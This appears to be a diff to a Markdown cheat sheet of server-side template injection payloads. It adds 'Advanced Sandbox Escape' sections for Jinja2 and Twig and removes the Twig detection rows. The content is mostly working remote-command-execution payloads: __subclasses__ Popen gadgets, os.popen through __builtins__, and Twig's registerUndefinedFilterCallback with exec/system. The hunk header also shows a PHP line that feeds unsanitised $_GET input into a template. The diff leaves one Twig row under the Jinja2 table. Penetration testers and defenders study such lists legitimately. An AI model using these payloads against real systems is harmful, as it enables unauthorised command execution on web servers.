@@ -59,13 +59,26 @@ echo $twig->createTemplate("Hello " . $_GET['name'])->render([]);
 | Alternative RCE | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` | `uid=...` |
 | Filter bypass | `{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0]}}` | Command output |
 
-### 🐘 Twig (PHP)
-
-| Stage | Payload | Expected Result |
-|---|---|---|
-| Detection | `{{7*7}}` | `49` |
-| Detection | `{{dump(app)}}` | Application object |
 | RCE | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` | Output of `id` |
+
+### 🛠️ Advanced Sandbox Escape (Jinja2)
+
+If `__globals__` or `__builtins__` are blocked, use `__mro__` to climb the class hierarchy:
+```python
+# List all subclasses of 'object'
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+
+# Find index of subprocess.Popen or os._wrap_close and call it
+{{ ''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate()[0] }}
+```
+
+### 🛠️ Advanced Sandbox Escape (Twig)
+
+In Twig 1.x / 2.x, `_self.env.registerUndefinedFilterCallback` is the most powerful gadget:
+```php
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+```
+In Twig 3.x, this is partially mitigated, but check for custom extensions implementing binary filters without validation.
 
 ### ☕ Freemarker (Java)
 
